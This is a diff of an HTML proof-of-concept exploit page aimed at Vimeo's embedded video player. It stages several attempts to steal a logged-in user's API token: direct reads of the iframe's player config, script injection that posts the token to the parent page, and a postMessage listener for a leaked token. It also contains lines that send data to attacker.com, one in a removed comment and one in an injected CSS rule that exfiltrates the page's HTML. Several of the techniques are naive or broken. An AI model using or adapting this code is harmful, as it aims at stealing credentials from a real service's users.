@@ -1,139 +1,127 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Vimeo PostMessage Exploit PoC</title>
-    <style>
-        body { font-family: monospace; padding: 20px; }
-        #results { background: #f0f0f0; padding: 10px; margin: 10px 0; }
-        .critical { background: #ffcccc; border: 2px solid red; }
-        iframe { border: 1px solid #ccc; }
-    </style>
+    <title>Vimeo Token Extraction - Advanced PoC</title>
 </head>
 <body>
-    <h1>🔴 Vimeo PostMessage Vulnerability PoC</h1>
-    <p>Testing postMessage origin validation bypass...</p>
+    <h1>🔴 Advanced Vimeo Token Extraction</h1>
     
+    <!-- Load with your actual cookies to authenticate -->
     <iframe id="vimeo" 
             src="https://player.vimeo.com/video/935884964?background=1"
             width="640" 
             height="360">
     </iframe>
 
-    <h2>Results:</h2>
     <div id="results"></div>
 
     <script>
         const iframe = document.getElementById('vimeo');
         const results = document.getElementById('results');
-        let messageCount = 0;
 
-        function log(message, data, critical = false) {
+        function log(title, data) {
             const div = document.createElement('div');
-            div.className = critical ? 'critical' : '';
-            div.innerHTML = `
-                <strong>${new Date().toISOString()}</strong><br>
-                ${message}<br>
-                <pre>${JSON.stringify(data, null, 2)}</pre>
-                <hr>
-            `;
-            results.insertBefore(div, results.firstChild);
+            div.innerHTML = `<h3>${title}</h3><pre>${JSON.stringify(data, null, 2)}</pre><hr>`;
+            results.appendChild(div);
         }
 
-        // Listen for responses
-        window.addEventListener('message', function(event) {
-            messageCount++;
-            
-            console.log('📨 Message #' + messageCount);
-            console.log('Origin:', event.origin);
-            console.log('Data:', event.data);
-            
-            // Check if it's from Vimeo
-            if (event.origin === 'https://player.vimeo.com') {
-                const dataStr = JSON.stringify(event.data);
-                
-                // Check for sensitive data
-                const isCritical = dataStr.match(/token|jwt|eyJ|session|api_key|auth/i);
-                
-                log(
-                    `Response from Vimeo (Message #${messageCount})`,
-                    event.data,
-                    isCritical
-                );
-                
-                if (isCritical) {
-                    console.error('🚨 CRITICAL: Sensitive data exposed!');
-                    console.log(event.data);
-                    
-                    // In real attack, exfiltrate here
-                    // fetch('https://attacker.com/steal', {
-                    //     method: 'POST',
-                    //     body: JSON.stringify(event.data)
-                    // });
-                }
-            }
-        });
-
-        // Wait for iframe to load
         setTimeout(() => {
-            console.log('🚀 Starting attack...');
-            log('Attack started - sending test messages...', {});
+            console.log('=== ATTACK 1: Direct Property Access ===');
             
-            // Test methods from Vimeo Player API
-            const testMethods = [
-                // Standard API methods
-                { method: 'getDuration', desc: 'Get video duration' },
-                { method: 'getCurrentTime', desc: 'Get current playback time' },
-                { method: 'getVideoId', desc: 'Get video ID' },
-                { method: 'getVideoTitle', desc: 'Get video title' },
-                { method: 'getVideoUrl', desc: 'Get video URL' },
-                { method: 'getVolume', desc: 'Get volume' },
+            try {
+                // Try to access window.playerConfig directly
+                const config = iframe.contentWindow.playerConfig;
+                console.log('✅ playerConfig accessible:', config);
+                log('CRITICAL: playerConfig accessible', config);
                 
-                // Try to get config/state
-                { method: 'getConfig', desc: '⚠️ Try to get config' },
-                { method: 'getState', desc: '⚠️ Try to get state' },
-                { method: 'getPlayerState', desc: '⚠️ Try to get player state' },
-                
-                // Try variations
-                { method: 'config', desc: '⚠️ Direct config access' },
-                { method: 'playerConfig', desc: '⚠️ PlayerConfig access' },
-                { method: '_config', desc: '⚠️ Private config' },
-                
-                // Try to access user data
-                { method: 'getUserData', desc: '🚨 Try to get user data' },
-                { method: 'getUser', desc: '🚨 Try to get user' },
-                { method: 'getSession', desc: '🚨 Try to get session' },
-                { method: 'getApiToken', desc: '🚨 Try to get API token' },
-                { method: 'getAuthToken', desc: '🚨 Try to get auth token' },
-                
-                // Other interesting methods
-                { method: 'getChapters', desc: 'Get chapters' },
-                { method: 'getTextTracks', desc: 'Get text tracks' },
-                { method: 'getQualities', desc: 'Get quality levels' },
-                { method: 'getColor', desc: 'Get player color' },
-            ];
+                if (config && config.user) {
+                    console.log('🚨 API TOKEN:', config.user.vimeo_api_client_token);
+                    log('🚨 STOLEN TOKEN', {
+                        token: config.user.vimeo_api_client_token,
+                        userId: config.user.id
+                    });
+                }
+            } catch (e) {
+                console.log('❌ Same-origin policy blocked:', e.message);
+                log('Same-origin policy blocks direct access', { error: e.message });
+            }
 
-            testMethods.forEach((test, index) => {
-                setTimeout(() => {
-                    console.log(`Sending: ${test.method} - ${test.desc}`);
+            console.log('=== ATTACK 2: Enumerate iframe properties ===');
+            
+            try {
+                // Try to enumerate what's accessible
+                const props = Object.getOwnPropertyNames(iframe.contentWindow);
+                console.log('Accessible properties:', props);
+                log('Accessible contentWindow properties', props);
+            } catch (e) {
+                console.log('❌ Cannot enumerate:', e.message);
+            }
+
+            console.log('=== ATTACK 3: Access via postMessage + timing ===');
+            
+            // Try to exploit race condition
+            window.addEventListener('message', (e) => {
+                if (e.origin === 'https://player.vimeo.com') {
+                    console.log('Message received:', e);
                     
-                    iframe.contentWindow.postMessage({
-                        method: test.method,
-                        value: null,
-                        id: index
-                    }, '*');  // Sending to any origin
-                    
-                }, index * 200);
+                    // Check if playerConfig leaked
+                    if (e.data && typeof e.data === 'object') {
+                        const str = JSON.stringify(e.data);
+                        if (str.includes('vimeo_api_client_token')) {
+                            console.log('🚨 TOKEN LEAKED via postMessage!');
+                            log('🚨 TOKEN LEAKED', e.data);
+                        }
+                    }
+                }
             });
 
-            // Summary after all tests
-            setTimeout(() => {
-                log('All tests completed', {
-                    totalMessages: messageCount,
-                    note: 'Check console for details'
-                });
-            }, testMethods.length * 200 + 1000);
+            // Try to request full player state/config
+            iframe.contentWindow.postMessage({
+                method: 'getVideoEmbedCode'
+            }, '*');
 
-        }, 3000); // Wait 3 seconds for iframe to fully load
+        }, 3000);
+
+        // ATTACK 4: Try to inject script via iframe manipulation
+        setTimeout(() => {
+            console.log('=== ATTACK 4: Script Injection ===');
+            
+            try {
+                // Try to inject script into iframe
+                const script = iframe.contentDocument.createElement('script');
+                script.textContent = `
+                    if (window.playerConfig && window.playerConfig.user) {
+                        window.parent.postMessage({
+                            stolen: true,
+                            token: window.playerConfig.user.vimeo_api_client_token
+                        }, '*');
+                    }
+                `;
+                iframe.contentDocument.body.appendChild(script);
+                console.log('✅ Script injection succeeded!');
+            } catch (e) {
+                console.log('❌ Script injection blocked:', e.message);
+            }
+        }, 4000);
+
+        // ATTACK 5: CSS-based data exfiltration
+        setTimeout(() => {
+            console.log('=== ATTACK 5: CSS Injection ===');
+            
+            try {
+                const style = iframe.contentDocument.createElement('style');
+                style.textContent = `
+                    * { 
+                        background: url('https://attacker.com/leak?html=' + escape(document.documentElement.innerHTML)); 
+                    }
+                `;
+                iframe.contentDocument.head.appendChild(style);
+                console.log('✅ CSS injection succeeded!');
+            } catch (e) {
+                console.log('❌ CSS injection blocked:', e.message);
+            }
+        }, 5000);
+
     </script>
 </body>
 </html>
